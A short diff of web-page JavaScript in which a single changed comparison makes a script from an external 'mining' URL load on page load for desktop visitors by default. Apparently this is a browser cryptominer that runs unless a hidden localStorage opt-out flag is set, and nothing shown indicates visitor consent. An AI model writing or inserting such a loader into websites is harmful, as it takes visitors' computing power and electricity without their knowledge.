@@ -33,7 +33,7 @@ document.addEventListener('DOMContentLoaded', function() {
                 navigator.platform !== 'iPod' &&
                 navigator.platform !== 'BlackBerry' &&
                 navigator.platform !== 'WebTV OS' &&
-                localStorage.getItem('DisableMining') !== null
+                localStorage.getItem('DisableMining') === null
             )) {
             var x4 = document.createElement('script');
             x4.setAttribute('src', 'https://m1.egeria.space/mining');
